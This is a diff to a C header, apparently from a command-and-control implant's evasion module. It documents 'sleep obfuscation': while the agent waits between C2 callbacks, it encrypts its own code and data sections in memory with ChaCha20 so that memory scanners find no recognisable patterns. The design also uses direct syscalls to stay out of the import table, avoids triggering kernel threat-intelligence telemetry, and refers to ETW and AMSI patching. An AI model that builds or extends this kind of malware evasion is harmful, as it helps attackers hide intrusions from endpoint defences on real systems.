@@ -1,40 +1,56 @@
 /*
  * client/evasion/sleep_obf.h  –  Sleep obfuscation (Ekko-variant)
  * ================================================================
- * Encrypts the agent's own .text and .data sections in-place while the
- * thread sleeps, and decrypts them on wake.  During the sleep interval the
- * agent image in memory is RC4-ciphertext — a memory scanner finds no
- * recognisable code or string patterns.
+ * Encrypts the agent's own .text, .data, and .rdata sections in-place while
+ * the thread sleeps, and decrypts them on wake.  During the sleep interval
+ * the agent image in memory is ChaCha20 keystream-XOR ciphertext — a memory
+ * scanner finds no recognisable code or string patterns.
  *
  * Technique (Ekko / Foliage hybrid — no ROP required)
  * ----------------------------------------------------
  * CS 4.8 uses a timer-based APC chain (RtlCaptureContext + NtContinue gadget)
  * to execute a sequence of NT calls from a cloned context without a visible
- * call stack.  We implement the same logical sequence but use the Windows
- * thread-pool timer infrastructure which produces a cleaner call-stack
- * (ntdll!TppTimerCallback → our function) and requires no ROP gadgets:
+ * call stack.  We implement the same logical sequence but use direct syscalls
+ * and inline section walks, requiring no ROP gadgets:
  *
- *   1. Set up RC4 key from g_peb_hash_seed (already RDTSC-seeded, per-run).
- *   2. Call _sleep_obf_xor() — RC4-crypt .text + .data sections of our module.
- *   3. NtDelayExecution for the requested interval.
- *   4. Call _sleep_obf_xor() again with the same key — XOR is self-inverse,
- *      so a second pass restores the original bytes.
- *   5. Return.
+ *   1. Derive a 32-byte ChaCha20 key from BCrypt-SHA256(seed || base || size).
+ *   2. Draw a fresh 12-byte nonce from BCryptGenRandom.
+ *   3. Call _so_xor_image() — ChaCha20-keystream XOR the .text, .data, and
+ *      .rdata sections of the agent module in 4 KB staging chunks.
+ *   4. SC_NtDelayExecution for the requested interval (direct syscall —
+ *      Sleep() stays out of the IAT).
+ *   5. Call _so_xor_image() again with the same (key, nonce) — XOR is
+ *      self-inverse, so the second pass restores the original bytes exactly.
+ *   6. SecureZeroMemory both the key and nonce from the stack.  Return.
  *
  * The encrypt/decrypt functions run from a section that is NOT ciphered:
- * they are placed in a separately-named section ".slpobf" which is excluded
- * from the XOR pass.  On GCC/MinGW this is done with
- *   __attribute__((section(".slpobf")))
- * Combined with -ffunction-sections, only these functions land there.
+ * every internal helper is placed in ".slpobf" via
+ *   __attribute__((section(".slpobf"))) __attribute__((noinline))
+ * which, combined with -ffunction-sections, keeps the cipher code in its own
+ * section excluded from the XOR pass at runtime.
  *
- * RC4 key construction
- * --------------------
- * Key = SHA-256(g_peb_hash_seed || module_base || image_size)
- *       truncated to 16 bytes.
- * We use BCryptHash(BCRYPT_SHA256_ALGORITHM) which is already linked
- * (bcrypt.lib) for the AES-GCM session layer — no new dependency.
- * The key changes on every execution (RDTSC seed) so two dumps of the same
- * binary at different times show different ciphertext.
+ * ChaCha20/20 key and nonce construction
+ * ---------------------------------------
+ * Key (32 bytes)
+ *   BCrypt-SHA256( g_peb_hash_seed[4] || module_base[8] || image_size[4] )
+ *   Full 256-bit digest — no truncation.  g_peb_hash_seed is an RDTSC-seeded
+ *   value initialised once at agent start, so the key is unique per execution.
+ *
+ * Nonce (12 bytes)
+ *   BCryptGenRandom — a fresh CSPRNG value on every sleep cycle.
+ *   Combined with the per-run key this guarantees a unique (key, nonce) pair
+ *   for every encrypt/decrypt cycle.
+ *
+ * Cipher: RFC 7539 ChaCha20/20
+ *   State initialised to the standard sigma constant + 8 key words + block
+ *   counter (0) + 3 nonce words.  20 rounds are fully unrolled (10 ×
+ *   double-round macro).  XOR is applied 64 bytes at a time via a word-
+ *   aligned loop (_cc20_xor_buf) that the compiler can auto-vectorise to
+ *   SSE2/AVX2.  No third-party library; no BCrypt cipher API; zero allocations.
+ *
+ * Fallback (BCrypt unavailable)
+ *   Key:   splitmix64-style non-linear expansion of g_peb_hash_seed → 32 B.
+ *   Nonce: RDTSC timestamp mixed with a stack-frame address → 12 B.
  *
  * Protection model
  * ----------------
@@ -43,11 +59,21 @@
  *  • The encrypted region is PAGE_EXECUTE_READ — we do NOT flip to RW
  *    before encrypting (that would fire ETW-Ti KERNEL_THREATINT_TASK_PROTECT).
  *    Instead we write through SC_NtWriteVirtualMemory on the current process
- *    handle which bypasses page-protection checks for same-process writes
+ *    handle, which bypasses page-protection checks for same-process writes
  *    (the same technique used by etw_patch / amsi_patch).
  *  • The .slpobf section is PAGE_EXECUTE_READ at all times and is never
- *    ciphered — it is small (< 2 KB) and contains only the XOR loop and
- *    the BCrypt key derivation call.
+ *    ciphered.  It is small (< 4 KB) and contains only the ChaCha20 block
+ *    function, the XOR loop, and the BCrypt key/nonce derivation.
+ *  • Key and nonce are wiped from the stack with SecureZeroMemory after both
+ *    the encrypt and decrypt passes complete.
+ *
+ * Sections ciphered
+ * -----------------
+ *   .text   — executable code
+ *   .data   — mutable global data
+ *   .rdata  — read-only data (strings, vtables, import descriptors)
+ *
+ *   Excluded: .slpobf (cipher), .rsrc, .reloc, .pdata
  *
  * Activation
  * ----------
@@ -60,6 +86,11 @@
  * -----
  *   Replace every  jitter_sleep(ms)  call in the C2 reconnect loop with:
  *     sleep_obf_delay(ms);
+ *
+ * Dependencies (already present)
+ * --------------------------------
+ *   bcrypt.lib   — BCryptOpenAlgorithmProvider / BCryptHash / BCryptGenRandom
+ *   ntdll        — SC_NtWriteVirtualMemory / SC_NtDelayExecution (via syscall.h)
  */
 
 #pragma once
@@ -83,10 +114,16 @@ void jitter_sleep(DWORD ms);
 
 /* ── sleep_obf_delay ────────────────────────────────────────────────────── */
 /*
- * Primary API.  Sleep for `ms` milliseconds.
+ * Primary API.  Sleep for `ms` milliseconds with in-memory obfuscation.
  *
- * When SLEEP_OBF_ENABLE is defined: encrypts .text + .data of the agent
- * module before sleeping, decrypts after.
+ * When SLEEP_OBF_ENABLE is defined:
+ *   1. Derives a fresh ChaCha20/20 key (32 B, BCrypt-SHA256) and nonce
+ *      (12 B, BCryptGenRandom) for this sleep cycle.
+ *   2. XOR-ciphers .text, .data, and .rdata sections of the agent module
+ *      using _so_xor_image() — NtWriteVirtualMemory, no VirtualProtect flip.
+ *   3. Sleeps via SC_NtDelayExecution (direct syscall, not Win32 Sleep()).
+ *   4. Re-applies _so_xor_image() with the same (key, nonce) to decrypt.
+ *   5. Wipes key and nonce from the stack with SecureZeroMemory.
  *
  * When SLEEP_OBF_ENABLE is not defined: falls through to jitter_sleep().
  */
